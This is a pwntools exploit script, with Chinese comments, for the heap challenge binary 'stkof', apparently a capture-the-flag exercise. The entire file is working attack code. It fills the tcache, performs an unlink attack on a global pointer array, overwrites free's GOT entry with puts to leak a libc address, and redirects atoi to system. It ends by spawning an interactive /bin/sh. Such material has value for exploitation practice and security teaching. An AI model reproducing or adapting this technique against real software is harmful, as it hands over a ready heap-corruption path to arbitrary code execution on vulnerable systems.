from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p       = process('./stkof')
elf     = ELF('./stkof')
libc    = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 函数利用
def create(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')
def edit(count, content):
    p.sendline('2')
    p.sendline(str(count))
    p.sendline(str(len(content)))
    p.sendline(content)
    p.recvuntil('OK\n')
def free(count):    # 需要用free泄露glibc地址, 所以不在最后添加p.recvuntil('OK\n')
    p.sendline('3')
    p.sendline(str(count))

s        = 0x602140         # s的初始地址
ptr      = s + (8 * 2)      # 要unlink的地址
atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']

# 创建三个堆块用来利用unlink
create(0x80)
create(0x30)
create(0x80)

# 因为开启了tcache机制, 所以需要先free掉7个堆块
create(0x80)
create(0x80)
create(0x80)
create(0x80)
create(0x80)
create(0x80)
create(0x80)
free(4)
free(5)
free(6)
free(7)
free(8)
free(9)
free(10)

FD = ptr - 0x18
BK = ptr - 0x10
payload  = p64(0x0) + p64(0x31)
payload += p64(FD) + p64(BK)
payload += b'a' * 0x10
payload += p64(0x30) + p64(0x90)
edit(2, payload)    # 设置第二个chunk并清除第三个堆块的P标志位
free(3)             # 释放第三个chunk, 并合并第二个chunk, 使其对第二个chunk调用unlink
p.recvuntil('OK\n')

payload  = p64(0) + p64(atoi_got)           # 0
payload += p64(puts_got) + p64(free_got)    # 1 2
edit(2, payload)        # 设置我们的s空间
edit(2, p64(puts_plt))  # 将free的got表改为puts的plt表
free(1)                 # 打印出puts的got的值
puts        = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
libc_base   = puts      - libc.symbols['puts']
system      = libc_base + libc.symbols['system']

edit(0, p64(system))        # 将atoi的got表改为system的地址
p.sendline('/bin/sh\x00')   # 输入/bin/sh即可触发system("/bin/sh")
p.interactive()
